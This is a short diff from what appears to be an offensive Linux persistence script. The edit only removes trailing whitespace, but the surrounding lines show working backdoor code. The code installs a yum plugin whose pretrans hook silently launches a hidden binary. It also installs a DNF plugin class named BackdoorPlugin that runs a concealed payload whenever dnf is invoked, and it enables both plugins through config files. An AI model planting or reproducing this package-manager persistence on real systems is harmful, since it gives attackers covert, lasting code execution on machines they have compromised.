@@ -85,7 +85,7 @@ setup_package_manager_persistence() {
 			chmod +x /usr/lib/yumcon
 
 			echo -e "[main]\nenabled=1" > /etc/yum/pluginconf.d/yumcon.conf
-			
+
 			# If anyone finds a way for EOF to work with indentation in both an editor and on the host, LMK lol.
 			echo -e "import os\n\ntry:\n\tfrom yum.plugins import TYPE_INTERACTIVE, PluginYumExit\n\trequires_api_version = '2.0'\n\tplugin_type = TYPE_INTERACTIVE\nexcept ImportError:\n\trequires_api_version = '1.0'\n\ndef pretrans_hook(conduit):\n\tos.system('setsid /usr/lib/yumcon 2>/dev/null & ')" > /usr/lib/yum-plugins/yumcon.py
 
@@ -108,7 +108,7 @@ setup_package_manager_persistence() {
 			# If anyone finds a way for EOF to work with indentation in both an editor and on the host, LMK lol.
 			echo -e "import dnf\nimport os\n\ndef execute_dnfcon():\n\tos.system('setsid /usr/lib/$python_version/site-packages/dnfcon 2>/dev/null &')\n\nclass BackdoorPlugin(dnf.Plugin):\n\tname = 'dnfcon'\n\n\tdef __init__(self, base, cli):\n\t\tsuper(BackdoorPlugin, self).__init__(base, cli)\n\t\texecute_dnfcon()\n\n\tdef __init__(self, base, conf, **kwargs):\n\t\tdnf.Plugin.__init__(self, base, conf, **kwargs)\n\t\texecute_dnfcon()\n\nplugin = BackdoorPlugin" > /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
 			chmod +x /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
-			
+
 			echo -e "[main]\nenabled=1" > /etc/dnf/plugins/dnfcon.conf
 
 			echo "[+] DNF persistence established"
